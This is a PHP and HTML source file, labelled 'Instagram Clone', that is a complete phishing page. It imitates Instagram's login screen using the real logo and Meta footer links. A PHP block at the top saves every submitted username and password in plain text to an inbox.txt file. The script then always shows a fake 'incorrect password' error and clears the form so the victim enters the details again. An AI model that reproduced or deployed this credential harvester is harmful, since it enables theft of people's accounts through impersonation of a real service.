<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $msg1 = $_POST["usernameInput"] ?? '';
    $msg2 = $_POST["passwordInput"] ?? '';
    file_put_contents(__DIR__ . "/../inbox.txt", $msg1 . " | " . $msg2 . PHP_EOL, FILE_APPEND | LOCK_EX);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Clone</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
body {margin:0;background:black;color:white;font-family:'Inter',sans-serif;display:flex;flex-direction:column;min-height:100vh;}
.container {max-width:400px;width:100%;padding:1rem;margin:auto;}
.card {background:black;border:1px solid #3d3d3d;padding:2rem;margin-bottom:1rem;}
.logo {font-size:50px;text-align:center;margin-bottom:2rem;}
input {width:100%;background:black;border:1px solid #3d3d3d;color:white;font-size:13px;padding:10px;margin-bottom:0.6rem;border-radius:4px;}
input:focus {outline:none;border-color:#6d6d6d;}
button {width:100%;background:#2563eb;color:white;font-weight:bold;font-size:14px;padding:10px;margin:10px 0;border:none;border-radius:6px;cursor:pointer;}
button:disabled {opacity:0.5;cursor:not-allowed;}
.or {display:flex;align-items:center;margin:20px 0;color:#9ca3af;font-size:13px;}
.or div {flex:1;border-top:1px solid #3d3d3d;}
.or span {margin:0 10px;}
.fb-login {display:flex;justify-content:center;align-items:center;color:#3b82f6;font-weight:bold;font-size:14px;margin-bottom:1rem;cursor:pointer;}
.fb-login svg {width:18px;height:18px;margin-right:8px;fill:currentColor;}
.forgot {text-align:center;font-size:12px;}
.extra {margin-top:1rem;font-size:12px;color:#9ca3af;text-align:center;}
.signup {background:black;border:1px solid #3d3d3d;padding:1rem;text-align:center;}
.signup a {color:#3b82f6;font-weight:bold;text-decoration:none;}
footer {margin-top:auto;padding:2rem 1rem;text-align:center;font-size:12px;color:#9ca3af;}
.footer-row {display:flex;flex-wrap:wrap;justify-content:center;gap:1rem;margin-bottom:0.75rem;}
.footer-row a {color:#9ca3af;text-decoration:none;white-space:nowrap;}
.footer-row a:hover {text-decoration:underline;}
.footer-bottom {display:flex;justify-content:center;align-items:center;gap:12px;flex-wrap:wrap;margin-top:1rem;}
.footer-bottom button {background:none;border:none;color:#9ca3af;font-size:12px;cursor:pointer;}
a {text-decoration:none;}
.forgot a {color:white;font-weight:bold;}
.extra a {color:#3b82f6;font-weight:normal;}
.forgot a:hover,.extra a:hover {text-decoration:underline;}
#errorMsg {color:#ff6b6b;font-size:12px;margin-top:8px;margin-bottom:10px;text-align:center;display:none;}
@media(max-width:420px){.container{padding:0.75rem;}.card{padding:1.25rem;}}
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <div class="logo">
      <i aria-label="Instagram" role="img" style="background-image:url('https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png');background-position:0px -2907px;background-size:auto;width:175px;height:51px;background-repeat:no-repeat;display:inline-block;"></i>
    </div>
    <form id="loginForm">
      <input name="usernameInput" id="usernameInput" placeholder="Phone number, username, or email" autofocus>
      <input id="passwordInput" name="passwordInput" placeholder="Password">
      <button id="loginBtn" type="button" disabled>Log in</button>
    </form>
    <div id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
    <div class="or"><div></div><span>OR</span><div></div></div>
    <div class="fb-login" id="fbBtn">
      <svg viewBox="0 0 24 24"><path d="M22 12a10 10 0 1 0-11.5 9.9v-7h-2v-3h2v-2c0-2 1.2-3.2 3-3.2.9 0 1.8.1 1.8.1v2h-1c-1 0-1.3.6-1.3 1.2v1.9h2.5l-.4 3h-2v7A10 10 0 0 0 22 12"/></svg>
      Log in with Facebook
    </div>
    <div class="forgot"><a href="#">Forgot password?</a></div>
    <div class="extra">You can also <a href="#">report content you believe is unlawful</a> in your country without logging in.</div>
  </div>
  <div class="signup">Don't have an account? <a href="#" id="signupLink">Sign up</a></div>
  <footer>
    <div class="footer-row">
      <a href="#">Meta</a>
      <a href="#">About</a>
      <a href="#">Blog</a>
      <a href="#">Jobs</a>
      <a href="#">Help</a>
      <a href="#">API</a>
      <a href="#">Privacy</a>
      <a href="#">Cookie Settings</a>
      <a href="#">Terms</a>
      <a href="#">Locations</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Meta AI</a>
    </div>
    <div class="footer-row">
      <a href="#">Meta AI Articles</a>
      <a href="#">Threads</a>
      <a href="#">Contact Uploading & Non-Users</a>
      <a href="#">Meta Verified</a>
    </div>
    <div class="footer-bottom">
      <button id="langBtn">English ▼</button>
      <span>© 2025 Instagram from Meta</span>
    </div>
  </footer>
</div>

<script>
const loginBtn = document.getElementById('loginBtn');
const usernameInput = document.getElementById('usernameInput');
const passwordInput = document.getElementById('passwordInput');
const errorMsg = document.getElementById('errorMsg');

function checkInputs() {
  loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
}
usernameInput.addEventListener('input', checkInputs);
passwordInput.addEventListener('input', checkInputs);

loginBtn.addEventListener('click', function() {
  const body = 'usernameInput='+encodeURIComponent(usernameInput.value)+'&passwordInput='+encodeURIComponent(passwordInput.value);
  fetch('/', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:body});
  errorMsg.style.display = 'block';
  usernameInput.value=''; passwordInput.value=''; checkInputs();
});

document.getElementById('fbBtn').addEventListener('click',function(){});
document.getElementById('signupLink').addEventListener('click',function(e){e.preventDefault();});
document.getElementById('langBtn').addEventListener('click',function(){});
</script>
</body>
</html>


